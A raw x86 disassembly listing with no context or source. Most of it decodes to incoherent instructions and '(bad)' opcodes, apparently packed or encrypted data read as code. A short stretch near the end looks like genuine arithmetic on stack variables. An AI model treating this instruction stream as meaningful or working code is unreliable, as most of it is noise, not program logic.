  41f4b5:	aam    0x19
  41f4b7:	mov    ecx,0x42ffc03e
  41f4bc:	call   DWORD PTR [ecx]
  41f4be:	popa   
  41f4bf:	in     eax,dx
  41f4c0:	jmp    0x68c32822
  41f4c5:	loop   0x41f4d3
  41f4c7:	mov    ecx,0xd804b301
  41f4cc:	jnp    0x41f463
  41f4ce:	xlat   BYTE PTR ds:[ebx]
  41f4cf:	out    0xc2,eax
  41f4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d2:	push   es
  41f4d3:	or     esp,DWORD PTR [edi-0x6812249a]
  41f4d9:	add    ebx,DWORD PTR [esi-0x144c3aa3]
  41f4df:	pop    edx
  41f4e0:	mov    cl,0xe0
  41f4e2:	and    bh,ah
  41f4e4:	adc    dl,BYTE PTR [esi]
  41f4e6:	push   0x9
  41f4e8:	push   cs
  41f4e9:	into   
  41f4ea:	(bad)  [eax]
  41f4ec:	test   eax,0xe28a4236
  41f4f1:	in     eax,0x12
  41f4f3:	xchg   esi,eax
  41f4f4:	push   es
  41f4f5:	xchg   esp,eax
  41f4f6:	mov    dh,0x27
  41f4f8:	sahf   
  41f4f9:	int    0x2a
  41f4fb:	fucomip st,st(5)
  41f4fd:	jae    0x41f547
  41f4ff:	getsec 
  41f501:	pop    esp
  41f502:	fisttp DWORD PTR [ebp+0x613d912]
  41f508:	mov    esi,0x141505b9
  41f50d:	arpl   cx,si
  41f50f:	fisubr WORD PTR [ebp+0x5acbb7d5]
  41f515:	and    BYTE PTR ds:0x844f3ad5,bl
  41f51b:	out    dx,eax
  41f51c:	jnp    0x41f572
  41f51e:	adc    ecx,DWORD PTR [eax]
  41f520:	ins    BYTE PTR es:[edi],dx
  41f521:	outs   dx,DWORD PTR ds:[esi]
  41f522:	cdq    
  41f523:	ins    DWORD PTR es:[edi],dx
  41f524:	sub    BYTE PTR [ebp-0x10],0x26
  41f528:	pusha  
  41f529:	dec    ecx
  41f52a:	outs   dx,DWORD PTR ds:[esi]
  41f52b:	arpl   WORD PTR [edx+0x49],bp
  41f52e:	retf   0x6c5a
  41f531:	ss pop edi
  41f533:	xchg   edi,eax
  41f534:	in     eax,dx
  41f535:	rcl    DWORD PTR [esi-0x15],cl
  41f538:	mov    fs:0x69e8b1ac,eax
  41f53e:	cmp    esi,edx
  41f540:	pop    esi
  41f541:	xchg   edi,eax
  41f542:	fs and al,0x4
  41f545:	xchg   ebx,eax
  41f546:	xchg   ebx,eax
  41f547:	and    edx,0x36
  41f54a:	mov    dl,bl
  41f54c:	imul   DWORD PTR [ecx]
  41f54e:	jae    0x41f59b
  41f550:	pop    edx
  41f551:	cmp    DWORD PTR [bp+0x5a],ebp
  41f555:	jmp    0xab042e2f
  41f55a:	adc    BYTE PTR [ebx+0x29],cl
  41f55d:	scas   al,BYTE PTR es:[edi]
  41f55e:	sub    eax,0x309a4c4f
  41f563:	int3   
  41f564:	popf   
  41f565:	jecxz  0x41f51b
  41f567:	stos   DWORD PTR es:[edi],eax
  41f568:	mov    esp,0x8ee47d47
  41f56d:	push   edi
  41f56e:	xchg   edx,eax
  41f56f:	mov    esi,0xa586063d
  41f574:	xor    cl,ah
  41f576:	fs sbb eax,0x4e7874a7
  41f57c:	jo     0x41f5f6
  41f57e:	sbb    bl,bh
  41f580:	fcom   DWORD PTR [edx+0x6073d051]
  41f586:	inc    edi
  41f587:	sub    bl,BYTE PTR ds:0x72a3010a
  41f58d:	sub    DWORD PTR [edx+0x51769d40],ebx
  41f593:	loop   0x41f56f
  41f595:	pop    eax
  41f596:	outs   dx,BYTE PTR ds:[esi]
  41f597:	mov    edx,?
  41f599:	jmp    0xe2a2:0x864d1a00
  41f5a0:	sbb    dh,al
  41f5a2:	sti    
  41f5a3:	test   al,0x54
  41f5a5:	nop
  41f5a6:	push   ecx
  41f5a7:	(bad)  
  41f5a8:	int3   
  41f5a9:	jae    0x41f5d8
  41f5ab:	bound  ebp,QWORD PTR [edx+0x60]
  41f5ae:	and    esp,DWORD PTR [esi+ebp*1+0x17]
  41f5b2:	shl    DWORD PTR [ecx+0x3b],cl
  41f5b5:	call   0x8cc4:0x9c451e03
  41f5bc:	cmp    ah,ah
  41f5be:	aam    0xf1
  41f5c0:	dec    edx
  41f5c1:	sub    eax,0xd271e2f1
  41f5c6:	stc    
  41f5c7:	retf   0x646d
  41f5ca:	(bad)  [eax-0x8af974d]
  41f5d0:	fnstsw WORD PTR [ebp-0x3c]
  41f5d3:	dec    esi
  41f5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5d5:	adc    BYTE PTR [ebx],ah
  41f5d7:	mov    edi,0xc65441c7
  41f5dc:	adc    esi,DWORD PTR [edx+0x626c1b41]
  41f5e2:	lods   al,BYTE PTR ds:[esi]
  41f5e3:	push   esi
  41f5e4:	pop    esp
  41f5e5:	inc    edi
  41f5e6:	sbb    al,0x82
  41f5e8:	cmp    al,BYTE PTR [esi+edx*4+0x5a8fa443]
  41f5ef:	jns    0x41f58c
  41f5f1:	jns    0x41f579
  41f5f3:	stos   BYTE PTR es:[edi],al
  41f5f4:	and    esp,ebp
  41f5f6:	push   ebp
  41f5f7:	mov    esp,0x9f070d53
  41f5fc:	sbb    DWORD PTR [ebp+0x120be86f],esp
  41f602:	jle    0x41f5b1
  41f604:	push   0x1a2129d
  41f609:	jle    0x41f63f
  41f60b:	(bad)  
  41f60c:	cmp    BYTE PTR [edi-0x7],ah
  41f60f:	fwait
  41f610:	xchg   esi,eax
  41f611:	movntq QWORD PTR [edx+0x1],mm0
  41f615:	inc    esi
  41f616:	xchg   ebx,eax
  41f617:	retf   0x7bd5
  41f61a:	inc    esp
  41f61b:	ss dec edi
  41f61d:	jmp    0x3c0176b3
  41f622:	mov    dh,dl
  41f624:	push   ds
  41f625:	outs   dx,DWORD PTR ds:[esi]
  41f626:	mov    cs,WORD PTR [ebx]
  41f628:	and    ecx,DWORD PTR [ebx]
  41f62a:	sub    ecx,DWORD PTR [esi+ebp*8-0x5d]
  41f62e:	cli    
  41f62f:	sub    BYTE PTR [ebx-0x1f],cl
  41f632:	std    
  41f633:	retf   
  41f634:	add    esi,DWORD PTR [ebx-0x16f02755]
  41f63a:	adc    DWORD PTR [esi],edx
  41f63c:	dec    esi
  41f63d:	out    0xf1,eax
  41f63f:	mov    ebx,0xf56d8411
  41f644:	js     0x41f657
  41f646:	xchg   ebx,eax
  41f647:	shl    BYTE PTR [ebx+eax*8+0x7a53d04f],0x5c
  41f64f:	int3   
  41f650:	hlt    
  41f651:	jb     0x41f64d
  41f653:	pop    es
  41f654:	adc    eax,0xafd79616
  41f659:	sub    DWORD PTR [ebx],esp
  41f65b:	sbb    ecx,DWORD PTR [eax]
  41f65d:	pop    es
  41f65e:	dec    eax
  41f65f:	xlat   BYTE PTR ds:[ebx]
  41f660:	lea    esi,[ecx+0x3e]
  41f663:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f665:	cwde   
  41f666:	ja     0x41f683
  41f668:	jp     0x41f685
  41f66a:	ins    BYTE PTR es:[edi],dx
  41f66b:	rol    DWORD PTR [eax-0x14],1
  41f66e:	hlt    
  41f66f:	push   ebp
  41f670:	xor    DWORD PTR [ebp-0x41],esi
  41f673:	lods   eax,DWORD PTR ds:[esi]
  41f674:	nop
  41f675:	push   ebx
  41f676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f677:	xchg   ebx,eax
  41f678:	sbb    BYTE PTR [ebx-0x66],cl
  41f67b:	mov    ebx,0x3c03b982
  41f680:	lds    edi,FWORD PTR [edi+ebx*8-0x58]
  41f684:	int    0x1e
  41f686:	loope  0x41f684
  41f688:	les    edx,FWORD PTR [eax]
  41f68a:	repz or eax,DWORD PTR [edi-0x1b]
  41f68e:	fsub   st,st(4)
  41f690:	cld    
  41f691:	outs   dx,DWORD PTR ds:[esi]
  41f692:	xchg   esi,eax
  41f693:	enter  0xb987,0xf0
  41f697:	das    
  41f698:	mov    ds:0xfbef6e8e,eax
  41f69d:	repnz adc BYTE PTR [ebp-0x24],dh
  41f6a1:	mov    al,ds:0x7ba6a74d
  41f6a6:	cmp    eax,0x371e7a33
  41f6ab:	add    al,0xfc
  41f6ad:	inc    edi
  41f6ae:	jno    0x41f6e2
  41f6b0:	inc    ecx
  41f6b1:	popa   
  41f6b2:	cmp    al,0xc4
  41f6b4:	(bad)  
  41f6b5:	ret    
  41f6b6:	and    al,0x87
  41f6b8:	mov    edi,0xd416ae63
  41f6bd:	ds mov ah,0x26
  41f6c0:	xor    BYTE PTR [edx],0x41
  41f6c3:	sub    BYTE PTR [esi+edi*4-0x18],ch
  41f6c7:	mov    al,0xf6
  41f6c9:	pop    edx
  41f6ca:	imul   esi,DWORD PTR ds:0x7025b480,0xe6245e9d
  41f6d4:	sahf   
  41f6d5:	adc    cl,dh
  41f6d7:	jmp    0x41f672
  41f6d9:	in     al,0x15
  41f6db:	jae    0x41f6a6
  41f6dd:	stos   DWORD PTR es:[edi],eax
  41f6de:	dec    ebp
  41f6df:	arpl   WORD PTR [edx],sp
  41f6e1:	xchg   esp,eax
  41f6e2:	in     al,dx
  41f6e3:	mov    cl,0xb3
  41f6e5:	push   ebp
  41f6e6:	sub    ah,BYTE PTR [edi+eax*4+0x5a]
  41f6ea:	std    
  41f6eb:	(bad)  
  41f6ec:	xchg   esp,eax
  41f6ed:	inc    ecx
  41f6ee:	sub    BYTE PTR [edx+0x14],ah
  41f6f1:	xor    DWORD PTR [ebx+0x2af0c8fb],edi
  41f6f7:	hlt    
  41f6f8:	add    DWORD PTR [esi+0x29],ecx
  41f6fb:	adc    eax,0xac625618
  41f700:	push   ebp
  41f701:	jle    0x41f6f4
  41f703:	dec    ecx
  41f704:	pop    esp
  41f705:	xor    ebx,DWORD PTR ds:0xcd9ab78b
  41f70b:	xchg   edx,eax
  41f70c:	push   esp
  41f70d:	dec    eax
  41f70e:	int3   
  41f70f:	mov    dl,0x3f
  41f711:	(bad)  
  41f713:	mov    ebx,0xd73df23d
  41f718:	sbb    eax,DWORD PTR [edi-0x1d]
  41f71b:	mov    ch,0x89
  41f71d:	idiv   BYTE PTR [eax+0x26de860d]
  41f723:	mov    ds:0x8222427d,eax
  41f728:	(bad)  
  41f72a:	inc    esp
  41f72b:	jecxz  0x41f79f
  41f72d:	test   DWORD PTR [ecx],0x4c6d3a3c
  41f733:	je     0x41f794
  41f735:	adc    bh,BYTE PTR ds:0x74fc4e6a
  41f73b:	pop    eax
  41f73c:	test   esp,esp
  41f73e:	jmp    0x41f71e
  41f740:	xchg   edx,eax
  41f741:	mov    ds:0x3fa5cde1,al
  41f746:	(bad)  
  41f747:	enter  0x35f0,0x66
  41f74b:	arpl   WORD PTR [eax+0x63],bp
  41f74e:	shl    BYTE PTR [ebx-0x679195c4],1
  41f754:	fst    QWORD PTR [esp+ebx*4+0x48]
  41f758:	pop    ss
  41f759:	out    dx,eax
  41f75a:	gs lock pop ebx
  41f75d:	sbb    ch,BYTE PTR [ebx]
  41f75f:	inc    esp
  41f760:	mov    ch,0xf9
  41f762:	jne    0x41f738
  41f764:	mov    dh,0xbb
  41f766:	mov    ss,WORD PTR [esi+0x6c]
  41f769:	sbb    DWORD PTR ds:[edi+0x2e],0x91df570d
  41f771:	sub    dh,BYTE PTR [esi]
  41f773:	sbb    al,0x25
  41f775:	push   eax
  41f776:	popf   
  41f777:	fst    QWORD PTR [ebx-0x54]
  41f77a:	shl    bh,0x35
  41f77d:	pop    es
  41f77e:	popf   
  41f77f:	mov    edx,DWORD PTR [ecx]
  41f781:	scas   eax,DWORD PTR es:[edi]
  41f782:	jo     0x41f79f
  41f784:	adc    DWORD PTR [ebp+0x69],ebp
  41f787:	(bad)  
  41f788:	icebp  
  41f789:	and    cl,BYTE PTR [ecx+0x3757ebdc]
  41f78f:	(bad)  
  41f790:	dec    ebx
  41f791:	mov    ah,ah
  41f793:	int3   
  41f794:	retf   0x6429
  41f797:	and    al,dl
  41f799:	scas   al,BYTE PTR es:[edi]
  41f79a:	mov    al,0xaf
  41f79c:	mov    ?,WORD PTR [ebx]
  41f79e:	xor    eax,0xcf7092aa
  41f7a3:	fdiv   st,st(1)
  41f7a5:	push   esi
  41f7a6:	cdq    
  41f7a7:	ins    DWORD PTR es:[edi],dx
  41f7a8:	mov    al,ds:0x2ed4c71f
  41f7ad:	push   ss
  41f7ae:	or     BYTE PTR [ebx+0x70b60542],dl
  41f7b4:	add    BYTE PTR [eax-0x75],dh
  41f7b7:	fcmovnbe st,st(0)
  41f7b9:	(bad)  [eax+eax*2+0x64]
  41f7bd:	inc    esi
  41f7be:	in     al,0x65
  41f7c0:	outs   dx,BYTE PTR ds:[esi]
  41f7c1:	fdivrp st(2),st
  41f7c3:	jmp    0x8afebde7
  41f7c8:	sub    eax,0x7a0f2e81
  41f7cd:	add    edx,DWORD PTR [edx-0x336043fc]
  41f7d3:	xchg   ebp,eax
  41f7d4:	push   0x22
  41f7d6:	mov    ds:0xb5c0f42a,al
  41f7db:	vcvttps2dq xmm3,XMMWORD PTR [ebx]
  41f7df:	out    dx,al
  41f7e0:	pop    edx
  41f7e1:	lods   eax,DWORD PTR es:[esi]
  41f7e3:	mov    esi,DWORD PTR [ecx+0x6b]
  41f7e6:	mov    esi,0xb89ef90a
  41f7eb:	push   edx
  41f7ec:	add    esi,DWORD PTR [edx+0x37e7c01c]
  41f7f2:	ins    BYTE PTR es:[edi],dx
  41f7f3:	(bad)  
  41f7f4:	adc    DWORD PTR [eax-0x742c745e],ebp
  41f7fa:	cmp    eax,0x610c6866
  41f7ff:	cmp    al,0xcc
  41f801:	mov    bh,0xf8
  41f803:	pop    esi
  41f804:	push   ds
  41f805:	adc    al,0xe7
  41f807:	iret   
  41f808:	sbb    al,0xe4
  41f80a:	pop    eax
  41f80b:	aas    
  41f80c:	or     bl,0x9
  41f80f:	ror    BYTE PTR ds:0xce7b2142,cl
  41f815:	not    DWORD PTR [ebx]
  41f817:	pusha  
  41f818:	dec    ebx
  41f819:	test   dh,al
  41f81b:	mov    ebp,0x4622316e
  41f820:	adc    al,0xf1
  41f822:	vandps ymm1,ymm7,YMMWORD PTR [edi+0x2e]
  41f827:	addr16 pop edx
  41f829:	stos   BYTE PTR es:[edi],al
  41f82a:	and    al,0x3a
  41f82c:	aaa    
  41f82d:	cs stos BYTE PTR es:[edi],al
  41f82f:	fwait
  41f830:	bound  ebp,QWORD PTR [ebp-0x2c]
  41f833:	ds out dx,eax
  41f835:	iret   
  41f836:	loopne 0x41f7d9
  41f838:	xchg   ecx,eax
  41f839:	pusha  
  41f83a:	iret   
  41f83b:	mov    eax,ds:0x3834ec26
  41f840:	imul   ebx,DWORD PTR [ebp+0x44],0xc878343
  41f847:	enter  0x54d8,0xe
  41f84b:	retf   
  41f84c:	int    0x18
  41f84e:	add    DWORD PTR [ecx],eax
  41f850:	daa    
  41f851:	imul   eax,DWORD PTR [ebx-0x16616567],0xffffffdc
  41f858:	or     DWORD PTR [ebx+0x69],esp
  41f85b:	push   es
  41f85c:	inc    ebp
  41f85d:	jle    0x41f85f
  41f85f:	and    DWORD PTR [ebx],0x932c269a
  41f865:	mov    ah,0x6d
  41f867:	fmul   QWORD PTR [edx+edx*8]
  41f86a:	dec    esp
  41f86b:	mov    ds:0x5a53906b,eax
  41f870:	mov    al,ds:0x51085b7a
  41f875:	popa   
  41f876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f877:	pop    ebx
  41f878:	popa   
  41f879:	sbb    DWORD PTR [eax+0x69af797a],0x7e
  41f880:	(bad)  
  41f881:	mov    DWORD PTR ds:[edx+ecx*1],eax
  41f885:	mov    bl,0xbb
  41f887:	xchg   esp,eax
  41f888:	dec    edi
  41f889:	gs mul bl
  41f88c:	(bad)  
  41f88d:	push   eax
  41f88e:	pop    ebx
  41f88f:	cs jle 0x41f847
  41f892:	inc    esi
  41f893:	pushf  
  41f894:	cmp    BYTE PTR [esi],cl
  41f896:	aaa    
  41f897:	or     bh,bl
  41f899:	cmp    cl,ch
  41f89b:	pop    esi
  41f89c:	div    DWORD PTR [ebp-0x164df806]
  41f8a2:	push   eax
  41f8a3:	pusha  
  41f8a4:	and    al,0xb4
  41f8a6:	(bad)  
  41f8a7:	pop    ebx
  41f8a8:	mov    dh,0xd2
  41f8aa:	xor    al,0x2f
  41f8ac:	push   esp
  41f8ad:	lods   al,BYTE PTR ds:[esi]
  41f8ae:	arpl   bp,bp
  41f8b0:	fs jmp 0x41f861
  41f8b3:	and    bh,BYTE PTR ds:0x75225a27
  41f8b9:	xor    DWORD PTR [ebp+0x7c7b1884],ecx
  41f8bf:	xchg   DWORD PTR [ecx+ebx*8-0xa],edi
  41f8c3:	int    0xa6
  41f8c5:	cdq    
  41f8c6:	or     eax,0x2f6aeba9
  41f8cb:	dec    eax
  41f8cc:	hlt    
  41f8cd:	mov    BYTE PTR [ecx-0x1454dd74],bl
  41f8d3:	ins    BYTE PTR es:[edi],dx
  41f8d4:	jbe    0x41f8fe
  41f8d6:	xor    al,0x44
  41f8d8:	aas    
  41f8d9:	sub    BYTE PTR [edi+ecx*8-0x45],bl
  41f8dd:	mov    al,0x7a
  41f8df:	stos   BYTE PTR es:[edi],al
  41f8e0:	mov    ebx,0x7396f6dd
  41f8e5:	push   ss
  41f8e6:	sub    al,0x2c
  41f8e8:	shl    BYTE PTR [ebp+0x6],0xee
  41f8ec:	in     al,0x3f
  41f8ee:	or     BYTE PTR [eax+0x1f31ef57],0xf5
  41f8f5:	jg     0x41f877
  41f8f7:	jmp    0x41f94f
  41f8f9:	sbb    esp,DWORD PTR [edx+esi*4-0x20]
  41f8fd:	arpl   WORD PTR [eax-0x70bbc534],ax
  41f903:	mov    bl,0x71
  41f905:	push   0x73352a80
  41f90a:	(bad)  
  41f90b:	fstp   TBYTE PTR [edi-0x56]
  41f90e:	in     eax,dx
  41f90f:	mov    al,ds:0x469208a
  41f914:	adc    eax,0x6bff8cf5
  41f919:	mov    ebx,0x61c4b427
  41f91e:	pop    ecx
  41f91f:	faddp  st(0),st
  41f921:	outs   dx,BYTE PTR ds:[esi]
  41f922:	rcr    DWORD PTR [ecx+0x69],0x2c
  41f926:	sub    BYTE PTR [ebx],cl
  41f928:	pop    ss
  41f929:	fmul   QWORD PTR [ecx-0x4a59d405]
  41f92f:	add    bh,bl
  41f931:	xlat   BYTE PTR ds:[ebx]
  41f932:	int3   
  41f933:	outs   dx,BYTE PTR ds:[esi]
  41f934:	lods   eax,DWORD PTR ds:[esi]
  41f935:	mov    edi,0x5b62bf1d
  41f93a:	stos   DWORD PTR es:[edi],eax
  41f93b:	and    al,0x66
  41f93d:	adc    DWORD PTR gs:[esi+0x63],esi
  41f941:	shl    al,1
  41f943:	inc    edi
  41f944:	dec    ebp
  41f945:	leave  
  41f946:	dec    eax
  41f947:	enter  0x64ce,0x8e
  41f94b:	aaa    
  41f94c:	jo     0x41f960
  41f94e:	aad    0xba
  41f950:	push   eax
  41f951:	(bad)  
  41f952:	in     eax,dx
  41f953:	fsub   QWORD PTR ds:0x19be364e
  41f959:	and    ah,BYTE PTR [ebp-0x75]
  41f95c:	pop    edx
  41f95d:	xchg   DWORD PTR [ebx-0x51],ebx
  41f960:	cmp    esi,DWORD PTR ds:0x1e0dfd91
  41f966:	and    BYTE PTR [ebp+edx*4-0x7e],dl
  41f96a:	bound  edx,QWORD PTR [eax+0x6a]
  41f96d:	das    
  41f96e:	in     al,0x49
  41f970:	setns  BYTE PTR [eax-0x34]
  41f974:	adc    BYTE PTR [eax-0x2dd64d3d],0xac
  41f97b:	dec    esp
  41f97c:	mov    ecx,0xcced858b
  41f981:	sbb    eax,0xab0d899f
  41f986:	aaa    
  41f987:	or     cl,cl
  41f989:	dec    DWORD PTR [ecx]
  41f98b:	inc    edi
  41f98c:	mov    dh,0x30
  41f98e:	shr    BYTE PTR [eax+0x33c13e4],cl
  41f994:	xor    DWORD PTR [eax+0x7b2138da],esp
  41f99a:	stc    
  41f99b:	lock inc edi
  41f99d:	fdivr  st(0),st
  41f99f:	cli    
  41f9a0:	test   al,0xb5
  41f9a2:	sub    DWORD PTR [edx],0x4c4831db
  41f9a8:	inc    ecx
  41f9a9:	cwde   
  41f9aa:	mov    esi,0xd4b66402
  41f9af:	add    BYTE PTR [esi+0x76d0b6ef],cl
  41f9b5:	in     eax,dx
  41f9b6:	mov    ch,0x8
  41f9b8:	dec    ecx
  41f9b9:	inc    esp
  41f9ba:	(bad)  
  41f9bb:	hlt    
  41f9bc:	pushf  
  41f9bd:	fcmovb st,st(0)
  41f9bf:	mov    esi,0x25a1af5
  41f9c4:	xchg   ebp,eax
  41f9c5:	sbb    ebx,esi
  41f9c7:	mov    ebx,0x3cd88e18
  41f9cc:	das    
  41f9cd:	inc    edx
  41f9ce:	popf   
  41f9cf:	sub    edx,DWORD PTR [edx]
  41f9d1:	inc    edi
  41f9d2:	test   BYTE PTR [ecx-0x54],bh
  41f9d5:	outs   dx,BYTE PTR ds:[esi]
  41f9d6:	cmp    ebp,0x93f0d008
  41f9dc:	cmc    
  41f9dd:	jge    0x41f9f6
  41f9df:	pop    ebp
  41f9e0:	jmp    0x2b20:0x33a4543b
  41f9e7:	xchg   ebp,eax
  41f9e8:	ins    DWORD PTR es:[edi],dx
  41f9e9:	rcl    DWORD PTR [ebp-0x2a17a588],0x7a
  41f9f0:	test   eax,0xea5f2030
  41f9f5:	test   eax,0x45d2809f
  41f9fa:	ja     0x41f99d
  41f9fc:	mov    bh,0x86
  41f9fe:	fisubr DWORD PTR [edx-0x3a]
  41fa01:	xchg   esp,eax
  41fa02:	popa   
  41fa03:	cmp    eax,0x5f900295
  41fa08:	mov    eax,0xf615c287
  41fa0d:	push   cs
  41fa0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa0f:	in     eax,dx
  41fa10:	sbb    ecx,DWORD PTR [edx]
  41fa12:	clc    
  41fa13:	xchg   DWORD PTR [edi],edi
  41fa15:	mov    bl,0x99
  41fa17:	xchg   ebp,eax
  41fa18:	int3   
  41fa19:	sbb    esp,DWORD PTR [ebx+0x3d]
  41fa1c:	xchg   ebx,eax
  41fa1d:	cmp    edi,DWORD PTR [ebx-0x456180f6]
  41fa23:	ficom  DWORD PTR [eax+0x236926bb]
  41fa29:	not    BYTE PTR [edi]
  41fa2b:	mov    ?,WORD PTR [esi+edi*8]
  41fa2e:	jne    0x465e2ee0
  41fa34:	add    ebx,DWORD PTR [ecx+ecx*2+0x67ceb0e5]
  41fa3b:	stc    
  41fa3c:	test   eax,0xf40b5f8f
  41fa41:	aaa    
  41fa42:	xor    esi,DWORD PTR [eax-0x44]
  41fa45:	popa   
  41fa46:	call   0x4fdbae
  41fa4b:	loope  0x41f9d4
  41fa4d:	mov    ecx,?
  41fa4f:	pushf  
  41fa50:	fistp  DWORD PTR [esi-0x2]
  41fa53:	call   0xcc79ec4d
  41fa58:	mov    ch,ah
  41fa5a:	inc    edx
  41fa5b:	psubb  mm7,QWORD PTR [ecx+edi*8]
  41fa5f:	ret    
  41fa60:	scas   al,BYTE PTR es:[edi]
  41fa61:	xlat   BYTE PTR ds:[ebx]
  41fa62:	cwde   
  41fa63:	fnstcw WORD PTR [edx*1-0x37ce053f]
  41fa6a:	or     eax,0xfac3ac3a
  41fa6f:	add    al,0x41
  41fa71:	or     eax,0xacadf51d
  41fa76:	pop    ss
  41fa77:	push   ss
  41fa78:	xchg   edx,eax
  41fa79:	mov    edi,0x856419f2
  41fa7e:	pop    ebp
  41fa7f:	fnstenv [ebp-0x5960de9f]
  41fa85:	or     DWORD PTR [esi-0x6ea673c8],ebx
  41fa8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa8c:	in     eax,0x46
  41fa8e:	cmp    al,0x69
  41fa90:	arpl   WORD PTR [esi-0x6ea5d809],dx
  41fa96:	es out dx,al
  41fa98:	dec    eax
  41fa99:	arpl   bp,bx
  41fa9b:	(bad)  
  41fa9c:	jle    0x41fa2c
  41fa9e:	enter  0xa9b1,0x30
  41faa2:	jo     0x41fad0
  41faa4:	fnstenv [esi-0x14]
  41faa7:	adc    DWORD PTR [ecx+ecx*1-0x5b03f2af],ebp
  41faae:	lods   eax,DWORD PTR ds:[esi]
  41faaf:	loopne 0x41fa79
  41fab1:	pop    eax
  41fab2:	dec    eax
  41fab3:	stos   DWORD PTR es:[edi],eax
  41fab4:	aas    
  41fab5:	sub    al,0xa4
  41fab7:	pop    edx
  41fab8:	sbb    edx,DWORD PTR [eax]
  41faba:	dec    ebx
  41fabb:	imul   ecx,DWORD PTR [esi-0x78f8bae5],0xff3df8c5
  41fac5:	dec    edx
  41fac6:	scas   eax,DWORD PTR es:[edi]
  41fac7:	sbb    cl,BYTE PTR [esi-0x20327d47]
  41facd:	add    cl,BYTE PTR [esi+ebp*4-0x63]
  41fad1:	mov    eax,ds:0x90867b92
  41fad6:	retf   0xdda1
  41fad9:	mov    bh,0xf5
  41fadb:	adc    eax,0xea6529b8
  41fae0:	ror    BYTE PTR [ebx],1
  41fae2:	fisub  WORD PTR [edi+0x64fa81d5]
  41fae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae9:	out    0xc0,al
  41faeb:	aas    
  41faec:	inc    esi
  41faed:	and    esi,DWORD PTR [ebp+ebp*1+0x7599f679]
  41faf4:	ds jmp 0x701c:0xcd0e446b
  41fafc:	pop    edi
  41fafd:	sbb    edi,DWORD PTR [esi]
  41faff:	jmp    0xfda7:0xeb12d0c1
  41fb06:	fisubr WORD PTR [ebp+0x26562955]
  41fb0c:	push   cs
  41fb0d:	inc    ebx
  41fb0e:	cdq    
  41fb0f:	pop    ebp
  41fb10:	xlat   BYTE PTR ds:[ebx]
  41fb11:	jmp    0x6d4a:0xf9f5d97e
  41fb18:	add    eax,0x6416dab7
  41fb1d:	fld    TBYTE PTR ds:0x50d0d666
  41fb23:	dec    eax
  41fb24:	arpl   sp,si
  41fb26:	mov    edx,0x41af132f
  41fb2b:	ins    BYTE PTR es:[edi],dx
  41fb2c:	int    0x9e
  41fb2e:	jmp    0xa340:0x23de92ff
  41fb35:	push   es
  41fb36:	pusha  
  41fb37:	or     eax,0x84d348b8
  41fb3c:	lds    ebp,FWORD PTR fs:[edx+ecx*8]
  41fb40:	add    DWORD PTR [ecx+0x76],0xffffffed
  41fb44:	popa   
  41fb45:	pop    edi
  41fb46:	cs mov edi,0xa8753a9d
  41fb4c:	and    DWORD PTR [ecx+0x2abb1e6],ebx
  41fb52:	hlt    
  41fb53:	inc    edx
  41fb54:	pop    ebp
  41fb55:	cmp    eax,0x9a276e71
  41fb5a:	pop    ds
  41fb5b:	pop    esi
  41fb5c:	xchg   ebx,eax
  41fb5d:	dec    edx
  41fb5e:	inc    ebp
  41fb5f:	mov    esp,0xc9a76c3e
  41fb64:	jle    0x41fb4a
  41fb66:	stc    
  41fb67:	and    BYTE PTR [esi+0x5bcef1e9],cl
  41fb6d:	loope  0x41fbaa
  41fb6f:	aaa    
  41fb70:	ja     0x41fb27
  41fb72:	pop    edx
  41fb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb74:	fdiv   QWORD PTR [eax]
  41fb76:	stos   DWORD PTR es:[edi],eax
  41fb77:	out    dx,eax
  41fb78:	add    al,0x79
  41fb7a:	mov    ecx,0x11c9dd2a
  41fb7f:	imul   esp,DWORD PTR [esi-0x60],0x7aad9706
  41fb86:	mov    BYTE PTR [bx+di+0x2e],dh
  41fb8a:	adc    ecx,DWORD PTR [ebp+0x654dbea3]
  41fb90:	dec    ecx
  41fb92:	in     al,dx
  41fb93:	jno    0x41fc0e
  41fb95:	mov    es,WORD PTR [edi+ebx*8]
  41fb98:	cmp    dh,BYTE PTR [esi]
  41fb9a:	bound  esi,QWORD PTR [edx+0x5388f463]
  41fba0:	or     DWORD PTR [ecx-0x69],0xffffffcb
  41fba4:	sbb    al,0xc5
  41fba6:	es push esp
  41fba8:	lea    esi,[edi-0x36bf5398]
  41fbae:	xor    DWORD PTR [ecx],ebp
  41fbb0:	enter  0x528a,0x91
  41fbb4:	push   ebx
  41fbb5:	ret    
  41fbb6:	adc    al,0x3a
  41fbb8:	test   al,0xce
  41fbba:	rol    BYTE PTR [ecx+0x64f893c1],cl
  41fbc0:	add    BYTE PTR [ebx],cl
  41fbc2:	retf   0x4d89
  41fbc5:	lods   al,BYTE PTR ds:[esi]
  41fbc6:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbc9:	mov    edx,DWORD PTR [ebp-0x50]
  41fbcc:	add    ecx,0x242ebcc
  41fbd2:	xor    ecx,edx
  41fbd4:	mov    DWORD PTR [ebp-0x50],ecx
  41fbd7:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbda:	mov    edx,DWORD PTR [ebp-0x4c]
  41fbdd:	add    ecx,edi
  41fbdf:	and    ecx,edx
  41fbe1:	mov    DWORD PTR [ebp-0x4c],ecx
  41fbe4:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbe7:	mov    edx,DWORD PTR [ebp-0x48]
  41fbea:	lea    ecx,[edx+ecx*1+0x241fcde]
  41fbf1:	mov    DWORD PTR [ebp-0x48],ecx
  41fbf4:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbf7:	mov    edx,0xfa5e1521
  41fbfc:	sub    edx,ecx
  41fbfe:	add    edx,DWORD PTR [ebp-0x44]
  41fc01:	mov    DWORD PTR [ebp-0x44],edx
  41fc04:	mov    ecx,DWORD PTR [ebp+0x8]
  41fc07:	jmp    0x421f6a
  41fc0c:	loope  0x41fbd6
  41fc0e:	xchg   ecx,eax
  41fc0f:	xchg   DWORD PTR [ebx-0x79],edi
